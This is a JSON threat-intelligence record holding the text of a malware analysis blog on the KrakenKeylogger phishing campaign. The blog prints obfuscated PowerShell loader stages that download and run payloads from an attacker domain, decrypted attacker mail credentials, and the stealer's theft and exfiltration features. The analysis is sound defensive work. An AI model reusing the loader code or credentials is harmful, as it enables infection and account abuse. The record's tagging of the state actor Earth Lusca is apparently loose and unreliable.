@@ -1,0 +1,145 @@
+{
+    "id": "0d0ff21e-1477-41e8-b68f-c30cfc66b9b8",
+    "created_at": "2023-06-05T02:06:31.633447Z",
+    "updated_at": "2024-11-22T02:03:10.948188Z",
+    "deleted_at": null,
+    "sha1_hash": "092e91fbcd1e8790756d2c55a999bff95554ff4e",
+    "title": "2023-05-20 - Kraken - The Deep Sea Lurker Part 1",
+    "authors": "",
+    "file_creation_date": "2023-06-04T12:50:23Z",
+    "file_modification_date": "2023-06-04T12:50:23Z",
+    "file_size": 10260353,
+    "plain_text": "Kraken - The Deep Sea Lurker Part 1\n0xtoxin.github.io/malware analysis/KrakenKeylogger-pt1/\nMay 20, 2023\n\nPart 1 of analyzing the KrakenKeylogger Malware\n5 minute read\n\n0xToxin\nThreat Analyst & IR team leader - Malware Analysis - Blue Team\n\nIntro\nIn this first part we will be going through a recent phishing campaign delivering a never seen\nbefore \u201cKrakenKeylogger\u201d malware.\n\nThe Phish\nThe mail sent to the victim is a simple malspam mail with archive attachment:\n\n1/15\n\nThe archive is a .zip archive that contains .lnk file:\n\n2/15\n\nLNK Analysis\nLEcmd Tool\nIn order to analyze an .lnk file I use the LeCMD tool. By using the tool we can see that the\n.lnk will execute PowerShell.exe alongside with an argument:\n\nPowerShell Script\nLet\u2019s breakdown the script:\n\n3/15\n\n\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy\nUnRestricted $ProgressPreference = 0;\nfunction nvRClWiAJT($OnUPXhNfGyEh){\n$OnUPXhNfGyEh[$OnUPXhNfGyEh.Length..0] -join('')\n};\nfunction sDjLksFILdkrdR($OnUPXhNfGyEh){\n$vecsWHuXBHu = nvRClWiAJT $OnUPXhNfGyEh;\nfor($TJuYrHOorcZu = 0;$TJuYrHOorcZu -lt $vecsWHuXBHu.Length;$TJuYrHOorcZu += 2){\ntry{\n$zRavFAQNJqOVxb += nvRClWiAJT $vecsWHuXBHu.Substring($TJuYrHOorcZu,2)\n}\ncatch{\n$zRavFAQNJqOVxb += $vecsWHuXBHu.Substring($TJuYrHOorcZu,1)\n}\n};\n$zRavFAQNJqOVxb\n};\n$NpzibtULgyi = sDjLksFILdkrdR 'aht1.sen/hi/coucys.erstmaofershma//s:tpht';\n$cDkdhkGBtl = $env:APPDATA + '\\' + ($NpzibtULgyi -split '/')[-1];\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;\n$wbpiCTsGYi = wget $NpzibtULgyi -UseBasicParsing;\n[IO.File]::WriteAllText($cDkdhkGBtl, $wbpiCTsGYi); & $cDkdhkGBtl;\nsleep 3;\nrm $cDkdhkGBtl;\n\nThe script will create a new string which will be the URL to the next payload, the script will\ntake the obfuscated URL string and will deobfuscate it in several steps:\n1. The string will be reversed by the function nvRClWiAJT.\n2. a for loop will iterate through the flipped string and will jump every 2 chars.\n3. each iteration 2 chars will be flipped again, and in the last iteration the last char will\nflipped also but it won\u2019t have any effect.\nHere is a quick python script that does this process:\ninput_string = 'aht1.sen/hi/coucys.erstmaofershma//s:tpht'[::-1]\noutput_string = ''\nfor i in range(0, len(input_string), 2):\ntry:\ntmp = input_string[i] + input_string[i + 1]\noutput_string += tmp[::-1]\nexcept:\noutput_string += input_string[i]\nprint(output_string)\nhttps://masherofmasters.cyou/chin/se1.hta\n\n4/15\n\nse1.hta\nThe fetched payload will be yet another powershell script:\n\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy\nUnRestricted\nfunction WQgtWbWK($FL, $i){\n[IO.File]::WriteAllBytes($FL, $i)\n};\nfunction APcZNMgjQ($FL){\nif($FL.EndsWith((QXUpF @(4995,5049,5057,5057))) -eq $True){\nStart-Process (QXUpF\n@(5063,5066,5059,5049,5057,5057,5000,4999,4995,5050,5069,5050)) $FL\n}else{\nStart-Process $FL\n}\n};\nfunction laiLJMT($eh){\n$LM = New-Object (QXUpF\n@(5027,5050,5065,4995,5036,5050,5047,5016,5057,5054,5050,5059,5065));\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::TLS12;\n$i = $LM.DownloadData($eh);\nreturn $i\n};\nfunction QXUpF($P){\n$n=4949;\n$s=$Null;\nforeach($WK in $P){\n$s+=[char]($WK-$n)\n};\nreturn $s\n};\nfunction deaNPih(){\n$AVYABiApT = $env:APPDATA + '\\';\n$XdOFJCmMx = laiLJMT (QXUpF\n@(5053,5065,5065,5061,5064,5007,4996,4996,5058,5046,5064,5053,5050,5063,5060,5051,505\n8,5046,5064,5065,5050,5063,5064,4995,5048,5070,5060,5066,4996,5048,5053,5054,5059,499\n6,5064,5050,4998,4995,5050,5069,5050));\n$qNfQDXYlR = $AVYABiApT + 'se1.exe';\nWQgtWbWK $qNfQDXYlR $XdOFJCmMx;\nAPcZNMgjQ $qNfQDXYlR;;;;\n}\ndeaNPih;\n\n5/15\n\nThe script has several obfuscated strings that are being deobfuscated using the function\nQXUpF by simply going over each number and substracting 4949 from it. here is a quick script\nthat will deobfuscate those strings and print the clear strings:\nstringsList = [[4995,5049,5057,5057],\n[5063,5066,5059,5049,5057,5057,5000,4999,4995,5050,5069,5050],\n[5027,5050,5065,4995,5036,5050,5047,5016,5057,5054,5050,5059,5065],\n[5053,5065,5065,5061,5064,5007,4996,4996,5058,5046,5064,5053,5050,5063,5060,5051,5058\n,5046,5064,5065,5050,5063,5064,4995,5048,5070,5060,5066,4996,5048,5053,5054,5059,4996\n,5064,5050,4998,4995,5050,5069,5050]]\nfor string in stringsList:\ntmp = ''\nfor char in string:\ntmp += chr(char - 4949)\nprint(f'[+] - {tmp}')\n[+] - .dll\n[+] - rundll32.exe\n[+] - Net.WebClient\n[+] - https://masherofmasters.cyou/chin/se1.exe\n\nThe script will download another file from the same domain previously used for fetching the\n.hta file in the previous powershell script.\n\n.NET Loader\nStage 1\nthe fetched executable (se1.exe) is a .NET executable:\n\nthe loader will decrypt embedded resource DataBasePracticalJob using the encryption\nalgorithim RC2, the key for the encryption will be the MD5 hash value of the hardcoded string\nQEssDJZhQnLywDnJGpBEr (The interesting part here is that the hashing applied on the string\nafter encoding it with BigEndianUnicode, 0x00 appends as a suffix to each byte.) Here is a\ndiagram of the decryption process:\n\n6/15\n\nyou can use this CyberChef Recipe in order to calculate the MD5 hash easily. Then using\nRC2 decryption in CyberChef we can also fetch the 2nd stage:\n\nStage 2\nThe second stage is a .NET DLL which will be invoked by the first stage executable.\nThe DLL will be invoke on its first public exported method which is syncfusion:\n\n7/15\n\nThe second strange DLL will have 2 embedded resources that will be decrypted, the first\nembedded resource SeaCyanPul will be a .DLL that will be in charge of injecting the final\npayload to RegAsm.exe (won\u2019t be getting into it right now but the 3rd stage will be uploaded to\nMalware Bazaar)\nThe second resource UnknownDetails will be our final payload which will be decrypted using\na simple AES-ECB encryption routine without IV, the key in this case will be a sha256 of null\nvalue:\n\nAs I wrote before that, the payload will injected to RegAsm.exe\n\nKraken Payload\nThe Kraken payload 32-bit .NET binary, so we can work with DnSpy to go over some of it\nfunctionalities.\n\nKraken Configs\nThe configs of the Kraken stored in the .cctor of the main class:\n\n8/15\n\nSome of the configs are encrypted using DES-EBC encryption routine without IV, the key is\nMD5 hash of a preconfigured string, in this case: swCpiTiAhkkEpyDZTnAGhOBZpr, here is a\nquick python script that will decrypt the config strings for us:\nimport malduck, base64\nfrom Crypto.Cipher import DES\nencryptedStringsDict = {\n'PersonalEmail': 'KYlYJirrzmj9NFMzqVxdqqmBPWvogKC9',\n'PersonalEmailPassword': 'lNI13bp6TxER2sT4YYxfjw==',\n'PersonalEmailHost': '6pvSg6TWhxedDZq2k3/l06fwica30Jlg',\n'TheSMTPReciver': 'qUQWGy6wVRm4PKDty97tnE+Z3alydqyP',\n'PersonalEmailPort': 'VqONpyzLqFY=',\n'PersonalHostLink': 'EdrE+GGMX48=',\n'PersonalHostPassword': 'EdrE+GGMX48=',\n'PersonalHostUsername': 'EdrE+GGMX48=',\n'TheTelegramToken': 'EdrE+GGMX48=',\n'PersonalTeleID': 'EdrE+GGMX48='\n}\nmd5hashKey = malduck.md5(b'swCpiTiAhkkEpyDZTnAGhOBZpr')[:8]\nfor k,v in encryptedStringsDict.items():\ndes = DES.new(md5hashKey, DES.MODE_ECB)\ndecVal = des.decrypt(base64.b64decode(v))\nprint(f'[+] {k} - {decVal.decode()}')\n\n[+] PersonalEmail - onuma.b@thereccorp.com\n[+] PersonalEmailPassword - O@1234\n[+] PersonalEmailHost - mail.thereccorp.com\n[+] TheSMTPReciver - jbs.hannong@gmail.com\n[+] PersonalEmailPort - 587\n[+] PersonalHostLink\n[+] PersonalHostPassword\n[+] PersonalHostUsername\n[+] TheTelegramToken\n[+] PersonalTeleID\n\n9/15\n\nSo now we have the configuration of the Kraken, let\u2019s move to some capabilities overview:\n\nCustom Commands\nThe Kraken has several functions that can be executed (only if the user of the malware flag\nthem during the compilation process of the stub), such as:\nTimeToRun\nLoadWeb\nDisable_Task\nDisable_CommandPrompt\nDisable_Regis\nProcessKiller\n\nNothing really interesting here, probably some persistence methods/VM checks.\n\nHarvesting Capabilities\n10/15\n\nThe kraken follows the usual info stealer path as stealing local Outlook, Foxmail,\nThunderBird mails credentials.\n\nIt will lookup for credentials in those browsers:\nGoogle Chrome\nQQ Browser\nVivaldi Browser\nChromium Browser\nCent Browser\nChedot Browser\n360Browser\nBrave\nTorch\nUC Browser\nBlisk\nOpera\nAvast Browser\nEdge\nGoogle Chrome Canary\nFirefox\nCocCoc\nCitrio Browser\nCoolNovo\nEpic Privacy Browser\nThe Kraken will also look for FileZilla Credentials\n\n11/15\n\nExfiltration\nThe Kraken allows exfiltration via:\nFTP\n12/15\n\nSMTP\nTelegram Bot\n\nFTP\n\nSMTP\n\nTelegram Bot\n\n13/15\n\nPost Exfiltration Actions\nAfter the stealing process was done, the Kraken will automatically start a keylogging process\n+ screenshot capturing of the victim\u2019s computer:\n\nIOC\u2019s\nDoc signed Subcontract Agreement.zip 79571f0ad832a31a1121f7c698496de7e4700271ccf0a7ed7fe817688528a953\n14/15\n\nseedof.lnk beec3ec08fba224c161464ebcc64727912c6678dd452596440809ce99c8390fd\n1st.exe - dddaf7dfb95c12acaae7de2673becf94fb9cfa7c2d83413db1ab52a5d9108b79\n2nd.dll - f7c66ce4c357c3a7c44dda121f8bb6a62bb3e0bc6f481619b7b5ad83855d628b\n3rd.dll - 43e79df88e86f344180041d4a4c9381cc69a8ddb46315afd5c4c3ad9e6268e17\nKraken.exe ee76fec4bc7ec334cc6323ad156ea961e27b75eaa7efb4e88212b81e65673000\n\nSummary\nIn this blog I\u2019ve covered a new .NET based stealer/keylogger malware, the way it was used\nin a phishing campaign, and a dive into the loader/injection process including overview of the\nmalware capabilities and config extraction.\n\nPart 2\nIn part 2 I will be explaining my Threat hunting process, why the malware being flagged\nfalsely? and how I managed to find more samples that helped me confirm my findings.\nPart 2 is up! check it out right here\n\n15/15",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-05-20 - Kraken - The Deep Sea Lurker Part 1.pdf"
+    ],
+    "report_names": [
+        "2023-05-20 - Kraken - The Deep Sea Lurker Part 1.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
+            "created_at": "2023-01-06T13:46:39.396409Z",
+            "updated_at": "2024-11-22T02:00:02.771904Z",
+            "deleted_at": null,
+            "main_name": "Earth Lusca",
+            "aliases": [
+                "ControlX",
+                "TAG-22",
+                "BRONZE UNIVERSITY",
+                "AQUATIC PANDA",
+                "Charcoal Typhoon",
+                "Red Scylla",
+                "CHROMIUM",
+                "RedHotel",
+                "BountyGlad",
+                "Red Dev 10"
+            ],
+            "source_name": "MISPGALAXY:Earth Lusca",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
+            "created_at": "2022-10-25T16:07:23.565337Z",
+            "updated_at": "2024-11-22T02:02:01.013901Z",
+            "deleted_at": null,
+            "main_name": "Earth Lusca",
+            "aliases": [
+                "Bronze University",
+                "Charcoal Typhoon",
+                "Chromium",
+                "Red Dev 10",
+                "Red Scylla"
+            ],
+            "source_name": "ETDA:Earth Lusca",
+            "tools": [
+                "Agentemis",
+                "AntSword",
+                "BIOPASS",
+                "BIOPASS RAT",
+                "BadPotato",
+                "Behinder",
+                "BleDoor",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "Doraemon",
+                "FRP",
+                "Fast Reverse Proxy",
+                "FunnySwitch",
+                "HUC Port Banner Scanner",
+                "KTLVdoor",
+                "Mimikatz",
+                "NBTscan",
+                "POISONPLUG.SHADOW",
+                "PipeMon",
+                "RbDoor",
+                "RibDoor",
+                "RouterGod",
+                "SAMRID",
+                "ShadowPad Winnti",
+                "SprySOCKS",
+                "WinRAR",
+                "Winnti",
+                "XShellGhost",
+                "cobeacon",
+                "fscan",
+                "lcx",
+                "nbtscan"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
+            "created_at": "2022-10-27T08:27:13.212301Z",
+            "updated_at": "2024-11-22T02:00:52.40294Z",
+            "deleted_at": null,
+            "main_name": "Earth Lusca",
+            "aliases": [
+                "Earth Lusca",
+                "TAG-22",
+                "Charcoal Typhoon",
+                "CHROMIUM",
+                "ControlX"
+            ],
+            "source_name": "MITRE:Earth Lusca",
+            "tools": [
+                "Mimikatz",
+                "PowerSploit",
+                "Tasklist",
+                "certutil",
+                "Cobalt Strike",
+                "Winnti for Linux",
+                "Nltest",
+                "NBTscan",
+                "ShadowPad"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1685930791633,
+    "ts_updated_at": 1732240990948,
+    "ts_creation_date": 1685883023000,
+    "ts_modification_date": 1685883023000,
+    "files": {
+        "pdf": "https://archive.orkl.eu/092e91fbcd1e8790756d2c55a999bff95554ff4e.pdf",
+        "text": "https://archive.orkl.eu/092e91fbcd1e8790756d2c55a999bff95554ff4e.txt",
+        "img": "https://archive.orkl.eu/092e91fbcd1e8790756d2c55a999bff95554ff4e.jpg"
+    }
+}
